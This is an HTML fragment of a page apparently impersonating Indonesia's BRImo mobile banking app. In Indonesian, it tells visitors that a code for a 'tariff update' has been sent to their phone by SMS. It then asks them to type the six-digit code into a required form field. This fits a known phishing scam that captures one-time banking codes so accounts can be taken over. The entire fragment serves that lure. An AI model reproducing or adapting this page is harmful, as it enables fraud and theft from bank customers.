<html lang="en">
  ...
  <body>
    ...
    <source src="kodetarif.mp3" type="audio/mpeg">
    </audio>
    <div class="container">
        <div class="box-lte">
            <div class="row" style="margin-top: 130px;">
                <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; : block; margin-top: -50px; border-radius: 0px;">
                    <img alt="" src="img/angdyv.png?w=384&h=246&auto=compress&dpr=2&fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
            ...
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
                    <p style="font-size: 13px; text-align: center; font-weight: bold;">Kode untuk pembaruan tarif BRImo telah kami kirim ke Nomor Handphone anda, Silahkan cek SMS lalu masukan Kode Tarif Anda dibawah ini<br/><br/></p><p style="font-size: 15px; text-align: center; font-weight: bold; color: #0f78cb;">Kode Tarif BRI (Wajib)</p>
            ...
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;">
                    <form method="post" action="" class="sms-form">
                        ...
                        <input type="tel" name="link" class="bubble-element Input form-log" placeholder="Kode Tarif BRI" maxlength="6" minlength="6" style="max-width: 90%; padding: 0px; cursor: pointer; text-align: center; display: block; margin: 20px auto; height: 45px; width: 346px; left: 0px; top: 0px; font-family: sans-serif; font-size: 14px; font-weight: bold; color: rgb(9, 140, 227); letter-spacing: 1.5px; line-height: 1; border-radius: 20px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" required>
                        </div>
                        <br>
